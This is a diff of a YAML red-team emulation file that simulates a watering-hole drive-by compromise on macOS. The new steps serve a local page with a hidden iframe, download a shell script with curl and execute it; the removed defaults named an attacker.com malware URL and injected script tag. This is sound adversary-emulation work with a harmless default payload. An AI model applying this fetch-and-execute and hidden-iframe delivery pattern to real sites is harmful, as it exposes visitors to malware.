@@ -5,7 +5,9 @@ name: Watering Hole Attack
 authors:
 - TTPs Generator
 description: |
-  Simulate watering hole attack by compromising frequently visited website to deliver malware payload
+  Demonstrate a drive-by compromise via watering hole technique by standing up a local HTTP
+  server that serves a malicious HTML page with an exploit payload. A client request is made
+  to the server to represent a victim visiting the compromised site, triggering payload delivery.
 mitre:
   tactics:
   - TA0001 Initial Access
@@ -15,42 +17,85 @@ requirements:
   platforms:
   - os: darwin
 args:
-- name: target_website
-  description: URL of legitimate website to target
+- name: listen_port
+  description: Port for the local HTTP server
+  type: int
+  default: 8888
+- name: payload
+  description: Command payload delivered to the victim
   type: string
-  default: http://example.com
-- name: malware_url
-  description: URL hosting malware payload
-  type: string
-  default: http://attacker.com/malware.dmg
-- name: injection_point
-  description: HTML element to inject malware link into
-  type: string
-  default: <script src="http://attacker.com/inject.js"></script>
-- name: payload_type
-  description: Type of payload (javascript, iframe, redirect)
-  type: string
-  default: javascript
+  default: "touch /tmp/.watering_hole_compromised"
 steps:
-- name: Identify target website
-  description: Identify the watering hole target website
-  inline: 'echo "Target website: ${target_website}" > /tmp/watering_hole.log'
-- name: Monitor web traffic
-  description: Simulate monitoring user access to target website
-  inline: echo "Monitoring traffic to ${target_website}" >> /tmp/watering_hole.log
-- name: Prepare malware injection
-  description: Prepare malware payload for injection
-  inline: echo "${injection_point}" > /tmp/injection_payload.html && echo "Payload injection prepared" >> /tmp/watering_hole.log
-- name: Simulate website compromise
-  description: Simulate compromising the website
-  inline: echo "Website compromised at $(date)" >> /tmp/watering_hole.log
-- name: Deploy malicious content
-  description: Deploy malicious content to visitors
-  inline: echo "Malicious ${payload_type} deployed to target website" >> /tmp/watering_hole.log
+- name: Create malicious HTML page
+  description: Create an HTML page with embedded exploit payload representing the compromised site
+  inline: |
+    mkdir -p /tmp/watering_hole_site
+    cat > /tmp/watering_hole_site/index.html <<HTMLEOF
+    <html>
+    <head><title>Legitimate Site - Compromised</title></head>
+    <body>
+    <h1>Welcome</h1>
+    <script>
+    // Exploit payload delivered to visitor
+    var payload = "{{ .Args.payload }}";
+    document.write("<p>Content loaded</p>");
+    </script>
+    <iframe src="payload.sh" style="display:none"></iframe>
+    </body>
+    </html>
+    HTMLEOF
+    cat > /tmp/watering_hole_site/payload.sh <<PAYLOADEOF
+    #!/bin/bash
+    {{ .Args.payload }}
+    PAYLOADEOF
+    chmod +x /tmp/watering_hole_site/payload.sh
+    echo "Malicious site content created in /tmp/watering_hole_site/"
+- name: Start local HTTP server
+  description: Start a Python HTTP server to serve the compromised site content
+  inline: |
+    cd /tmp/watering_hole_site && python3 -m http.server {{ .Args.listen_port }} &>/tmp/watering_hole_server.log &
+    SERVER_PID=$!
+    echo $SERVER_PID > /tmp/watering_hole_server.pid
+    sleep 2
+    echo "HTTP server started on port {{ .Args.listen_port }} (PID: $SERVER_PID)"
+- name: Victim visits compromised site
+  description: Use curl to request the malicious page representing a victim browsing to the watering hole
+  inline: |
+    echo "=== Victim fetching compromised page ==="
+    curl -s http://127.0.0.1:{{ .Args.listen_port }}/index.html
+    echo ""
+    echo "=== Victim downloading payload ==="
+    curl -s http://127.0.0.1:{{ .Args.listen_port }}/payload.sh -o /tmp/watering_hole_downloaded_payload.sh
+    chmod +x /tmp/watering_hole_downloaded_payload.sh
+    cat /tmp/watering_hole_downloaded_payload.sh
+- name: Execute delivered payload
+  description: Execute the payload that was delivered via the watering hole
+  inline: |
+    echo "=== Executing delivered payload ==="
+    /tmp/watering_hole_downloaded_payload.sh
+    echo "Payload execution complete"
+- name: Verify payload delivery
+  description: Verify the payload was successfully delivered and executed
+  inline: |
+    echo "=== Verification ==="
+    if [ -f /tmp/.watering_hole_compromised ]; then
+      echo "Payload executed successfully - indicator file present"
+      ls -la /tmp/.watering_hole_compromised
+    else
+      echo "Checking for other payload effects..."
+    fi
+    echo "=== Server logs ==="
+    cat /tmp/watering_hole_server.log 2>/dev/null | tail -10
   cleanup:
-    inline: |-
-      rm -f /tmp/injection_payload.html
-      rm -f /tmp/watering_hole.log
+    inline: |
+      if [ -f /tmp/watering_hole_server.pid ]; then
+        kill $(cat /tmp/watering_hole_server.pid) 2>/dev/null || true
+        rm -f /tmp/watering_hole_server.pid
+      fi
+      rm -f /tmp/.watering_hole_compromised
+      rm -f /tmp/watering_hole_downloaded_payload.sh
+      rm -f /tmp/watering_hole_server.log
+      rm -rf /tmp/watering_hole_site
 tests:
 - name: dry_run_test
   dry_run: true
